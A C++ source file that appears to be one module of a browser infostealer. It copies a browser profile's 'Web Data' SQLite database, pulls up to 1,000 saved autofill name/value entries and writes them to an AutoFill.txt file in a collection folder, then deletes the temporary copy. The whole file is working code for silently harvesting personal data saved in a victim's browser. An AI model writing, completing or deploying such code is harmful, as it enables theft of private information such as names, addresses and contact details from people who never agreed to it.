//
// Created by .1qxz on 09.06.2024.
//

#include "CAutoFill.h"

void CAutoFill::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "Web Data";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<AutoFill> history = CAutoFill::getAutoFill(copied_db);

    fs::remove(copied_db);

    if(history.empty())
        return;

    std::stringstream ss;

    for(AutoFill &row : history)
        row.write(ss);

    Utils::writeFile(root / "AutoFill.txt", ss.str(), true);
}

std::list<AutoFill> CAutoFill::getAutoFill(const fs::path &db_path) {
    std::list<AutoFill> fills;

    SQLiteUtil::connectAndRead("SELECT name, value FROM autofill ORDER BY date_last_used DESC LIMIT 0, 1000", db_path, [&fills](sqlite3_stmt *stmt) {
        const unsigned char* name = sqlite3_column_text(stmt, 0);
        const unsigned char* value = sqlite3_column_text(stmt, 1);

        AutoFill autoFillRecord;
        autoFillRecord.name = std::string(reinterpret_cast<const char*>(name));
        autoFillRecord.value = std::string(reinterpret_cast<const char*>(value));

        fills.push_back(autoFillRecord);
    });

    return fills;
}
